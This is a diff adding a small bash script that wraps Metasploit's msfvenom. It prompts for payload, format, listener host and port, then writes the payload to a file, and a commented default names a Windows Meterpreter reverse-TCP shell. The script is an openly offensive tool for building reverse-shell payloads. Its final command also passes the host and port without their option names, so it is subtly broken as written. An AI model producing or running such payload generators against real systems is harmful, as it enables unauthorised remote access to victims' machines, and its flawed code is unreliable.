@@ -1,0 +1,21 @@
+#!/bin/bash
+MSF_PATH="/opt/metasploit/app/"
+MSFV=$MSF_PATH"msfvenom";
+#INTERFACE="eth0";
+#LPORT="8080";
+#PAYLOAD="windows/meterpreter/reverse_tcp";
+read -p "Enter your FORMAT (Linux:elf, Windows:exe, Mac:macho, PHP:raw, ASP:asp, JSP:raw, War:war, Bash:raw, Pythom:raw, Perl:raw) : " file
+read -p "Enter your LANG (Linux:elf, Windows:exe, Mac:macho, PHP:php, ASP:asp, JSP:jsp, War:war, Bash:sh, Pythom:py, Perl:pl) : " lang
+read -p "Enter your PAYLOAD: " payload
+read -p "Enter your LHOST: " lhost
+read -p "Enter your LPORT: " lport
+read -p "Enter your NAME: " name
+echo "!!!Starting Msfvenom!!!";
+#LHOST=`ifconfig $INTERFACE | grep "inet addr" | cut -d":" -f2 | cut -d" " -f1`;
+echo "FORMAT=$file";
+echo "PAYLOAD=$payload";
+echo "LHOST=$lhost";
+echo "LPORT=$lport";
+echo "LANG=$lang";
+echo "NAME=$name";
+$MSFV -p $payload $lhost $lport -f $file > $name.$lang
